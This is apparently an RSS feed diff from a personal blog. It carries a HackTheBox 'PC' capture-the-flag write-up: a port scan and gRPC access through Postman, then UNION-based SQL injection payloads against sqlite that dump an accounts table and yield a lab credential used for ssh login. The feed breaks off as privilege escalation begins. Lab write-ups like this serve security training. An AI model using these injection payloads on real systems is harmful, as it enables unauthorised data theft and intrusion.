@@ -1,0 +1,474 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>SQL Injection on Spencer&#39;s Blog</title>
+        <link>https://yuwenmichael.netlify.app/tags/sql-injection/</link>
+        <description>Recent content in SQL Injection on Spencer&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <lastBuildDate>Sat, 07 Oct 2023 10:18:48 -0500</lastBuildDate><atom:link href="https://yuwenmichael.netlify.app/tags/sql-injection/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>HackTheBox - PC</title>
+        <link>https://yuwenmichael.netlify.app/post/hackthebox-pc/</link>
+        <pubDate>Sat, 07 Oct 2023 10:18:48 -0500</pubDate>
+        
+        <guid>https://yuwenmichael.netlify.app/post/hackthebox-pc/</guid>
+        <description>&lt;img src="https://yuwenmichael.netlify.app/post/hackthebox-pc/PC.png" alt="Featured image of post HackTheBox - PC" /&gt;&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Initial nmap:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report for 10.10.11.214
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up (0.047s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: 65533 filtered tcp ports (no-response)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT      STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;50051/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;...SNIP...&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap done: 1 IP address (1 host up) scanned in 205.03 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;There is very little information right out the gate, only a port that nmap fails to identify. However, quick google searching shows that this port is used in &lt;a class=&#34;link&#34; href=&#34;https://xrpl.org/configure-grpc.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;gRPC API&lt;/a&gt;. Interacting with it requires a specific protocol, so we need to use a tailored program.
+While I initially started enumeration with grpc_cli and &lt;a class=&#34;link&#34; href=&#34;https://medium.com/@at_ishikawa/use-grpc-cli-to-request-a-grpc-server-37219b33c94b&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;this resource&lt;/a&gt;, I had a lot of trouble passing a login token and switched to &lt;a class=&#34;link&#34; href=&#34;https://www.postman.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Postman API&lt;/a&gt;. As such, I will cover only using Postman from the beginning.&lt;/p&gt;
+&lt;h3 id=&#34;interacting-with-grpc-via-postman&#34;&gt;Interacting with gRPC via Postman&lt;/h3&gt;
+&lt;p&gt;To use, simply extract the tarball and run &lt;code&gt;Postman&lt;/code&gt; binary:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(kali㉿kali)-[~/Documents/pc]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ tar -xvf postman-linux-x64.tar.gz 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Postman/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Postman/app/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Postman/app/icons/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;...SNIP...&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Postman/app/locales/ru.pak
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Postman/Postman
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(kali㉿kali)-[~/Documents/pc]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ cd Postman 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(kali㉿kali)-[~/Documents/pc/Postman]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;app  Postman
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(kali㉿kali)-[~/Documents/pc/Postman]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ ./Postman               
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The GUI will open up, and we can create an account or skip for now:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/PostLaunch.png&#34;
+	width=&#34;1283&#34;
+	height=&#34;605&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/PostLaunch_hu3d5c744d508617588db594d18388e454_64664_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/PostLaunch_hu3d5c744d508617588db594d18388e454_64664_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Skipping Postman Registration&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;212&#34;
+		data-flex-basis=&#34;508px&#34;
+	
+&gt;
+We can set up our request first by selecting gRPC:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/setgrpc.png&#34;
+	width=&#34;1229&#34;
+	height=&#34;458&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/setgrpc_hu72a8a8931edf63dc8c9b3b1c3a78fe00_62382_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/setgrpc_hu72a8a8931edf63dc8c9b3b1c3a78fe00_62382_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Selecting gRPC request type&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;268&#34;
+		data-flex-basis=&#34;644px&#34;
+	
+&gt;
+Now when we supply the URL, API methods will be loaded automatically thanks to server reflection query:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/servicereflection.png&#34;
+	width=&#34;898&#34;
+	height=&#34;422&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/servicereflection_hu4b5d5f5fa55bdc2cf8a797be3a38e70b_30402_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/servicereflection_hu4b5d5f5fa55bdc2cf8a797be3a38e70b_30402_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Viewing SimpleApp&amp;rsquo;s functions&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;212&#34;
+		data-flex-basis=&#34;510px&#34;
+	
+&gt;
+First, we can try to register a user. Once again, the query is made easy with Postman&amp;rsquo;s &amp;ldquo;use example message&amp;rdquo; feature. It will create for us a structured JSON message with all necessary parameters. For my account, I edited the example to have a username/password of &lt;code&gt;asdf&lt;/code&gt;.
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/register.png&#34;
+	width=&#34;899&#34;
+	height=&#34;628&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/register_hu12584aef14832f10d638ef6d2ac62daf_38111_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/register_hu12584aef14832f10d638ef6d2ac62daf_38111_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Registering asdf&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;143&#34;
+		data-flex-basis=&#34;343px&#34;
+	
+&gt;
+Next, we can log in. The server responds with giving us an id number. Notice also, the Trailers tab. This will contain our login token, which we must supply for logged-in activities.
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login1.png&#34;
+	width=&#34;874&#34;
+	height=&#34;560&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login1_hu4e54826f7d1d4c4b4ffbe05d9398333e_36263_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login1_hu4e54826f7d1d4c4b4ffbe05d9398333e_36263_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Logging in as asdf&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;156&#34;
+		data-flex-basis=&#34;374px&#34;
+	
+&gt;
+Selecting the Trailers tab we can view:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login2.png&#34;
+	width=&#34;897&#34;
+	height=&#34;184&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login2_hu1730bf8991c4dd9c4c4238b8dc6739b2_18001_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login2_hu1730bf8991c4dd9c4c4238b8dc6739b2_18001_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Viewing login token&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;487&#34;
+		data-flex-basis=&#34;1170px&#34;
+	
+&gt;
+To use this token, we can go to the Metadata tab, and add the key as &amp;rsquo;token&amp;rsquo; and the value the copied value from Trailers, omitting the b&amp;rsquo;&amp;rsquo;.
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login3.png&#34;
+	width=&#34;894&#34;
+	height=&#34;307&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login3_hu86c693766c84bcddd9ea4d44f1afeca1_26271_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/login3_hu86c693766c84bcddd9ea4d44f1afeca1_26271_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Adding login token to Metadata&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;291&#34;
+		data-flex-basis=&#34;698px&#34;
+	
+&gt;
+Finally, we can use the getInfo function. &amp;ldquo;Use Example Message&amp;rdquo; will again auto-suggest a valid JSON request, that we can use to supply our own id value:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/getinfo1.png&#34;
+	width=&#34;870&#34;
+	height=&#34;540&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/getinfo1_hu2ff9eabd75c2c05a72feee201f910675_33741_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/getinfo1_hu2ff9eabd75c2c05a72feee201f910675_33741_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Checking our number&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;161&#34;
+		data-flex-basis=&#34;386px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;sql-injection-in-getinfo-function&#34;&gt;SQL Injection in getInfo function&lt;/h3&gt;
+&lt;p&gt;After trying several things, we might learn that this API is vulnerable to SQL injection. In the below example, I use UNION injection to insert the number &amp;lsquo;1&amp;rsquo; in the response:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union1.png&#34;
+	width=&#34;876&#34;
+	height=&#34;549&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union1_hud8b7685cebe1c999427bfbe721c3905a_33923_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union1_hud8b7685cebe1c999427bfbe721c3905a_33923_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;UNION SELECT 1&amp;ndash; -&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;159&#34;
+		data-flex-basis=&#34;382px&#34;
+	
+&gt;
+First, we can determine the database type by enumerating versions. This way, I find that the service is using sqlite:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union2.png&#34;
+	width=&#34;897&#34;
+	height=&#34;539&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union2_huaecbaa7ea0a0d6270efaf277e0545574_36007_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union2_huaecbaa7ea0a0d6270efaf277e0545574_36007_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;UNION SELECT sqlite_version();&amp;ndash; -&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;399px&#34;
+	
+&gt;
+Using a query from &lt;a class=&#34;link&#34; href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PayloadAllTheThings&lt;/a&gt;, I am able to dump databases. We are likely already seeing &lt;code&gt;messages&lt;/code&gt;, and &lt;code&gt;accounts&lt;/code&gt; will have interesting information.
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union3.png&#34;
+	width=&#34;906&#34;
+	height=&#34;544&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union3_hu6643f6736667dd7b8d0a8a6e884ca40b_40969_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union3_hu6643f6736667dd7b8d0a8a6e884ca40b_40969_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=&amp;lsquo;table&amp;rsquo; and tbl_name NOT like &amp;lsquo;sqlite_%&amp;rsquo;&amp;ndash; -&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;399px&#34;
+	
+&gt;
+Next, enumerating the columns in table &lt;code&gt;accounts&lt;/code&gt;:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union4.png&#34;
+	width=&#34;894&#34;
+	height=&#34;524&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union4_hu0cd081d5f33f40633e6e187a8aea192b_42295_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union4_hu0cd081d5f33f40633e6e187a8aea192b_42295_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;UNION SELECT sql FROM sqlite_master WHERE type!=&amp;lsquo;meta&amp;rsquo; AND sql NOT NULL AND name =&amp;lsquo;accounts&amp;rsquo;&amp;ndash; -&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;170&#34;
+		data-flex-basis=&#34;409px&#34;
+	
+&gt;
+Seeing &lt;code&gt;\n\t&lt;/code&gt; simply refers to a newline, followed by tab indentation. There are 2 column entries, &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt;. First, finding &lt;code&gt;password&lt;/code&gt;:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union5.png&#34;
+	width=&#34;889&#34;
+	height=&#34;529&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union5_hu3300dcd6266e0a59f6e7c7d4a1483a13_37337_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union5_hu3300dcd6266e0a59f6e7c7d4a1483a13_37337_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;UNION SELECT password FROM accounts&amp;ndash; -&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;168&#34;
+		data-flex-basis=&#34;403px&#34;
+	
+&gt;
+Now with a password, we can find a matching username:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union6.png&#34;
+	width=&#34;892&#34;
+	height=&#34;529&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union6_hucc58fbb9682e4f2c69a409bbca028ae1_35504_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union6_hucc58fbb9682e4f2c69a409bbca028ae1_35504_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;UNION SELECT username FROM accounts&amp;ndash; -&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;168&#34;
+		data-flex-basis=&#34;404px&#34;
+	
+&gt;
+Although we have a username, this does not really seem like a password that a user &amp;lsquo;admin&amp;rsquo; would have. With my current injection, I am just retrieving the first entry in the &lt;code&gt;username&lt;/code&gt; field. However, we can be extra sure to match the username &amp;amp; password by using WHERE:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union7.png&#34;
+	width=&#34;881&#34;
+	height=&#34;518&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union7_hude5b1a2e787fee515326be44b6ea5b97_36232_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/union7_hude5b1a2e787fee515326be44b6ea5b97_36232_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;UNION SELECT username FROM accounts WHERE password=&amp;lsquo;HereIsYourPassword1431&amp;rsquo;&amp;ndash; -&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;170&#34;
+		data-flex-basis=&#34;408px&#34;
+	
+&gt;
+Finally, we have a credential pair of &lt;code&gt;sau:HereIsYourPassWord1431&lt;/code&gt;. Fortunately, this is enough to gain entry into the system. We are able to use ssh:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Documents/Academy/sysmon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ ssh sau@10.10.11.214      
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;...SNIP..&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sau@pc:~$ id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sau&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sau&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sau&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;h3 id=&#34;internal-web-server-pyload&#34;&gt;Internal web server pyLoad&lt;/h3&gt;
+&lt;p&gt;Enumerating open ports, we find an internal port not available to us earlier:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
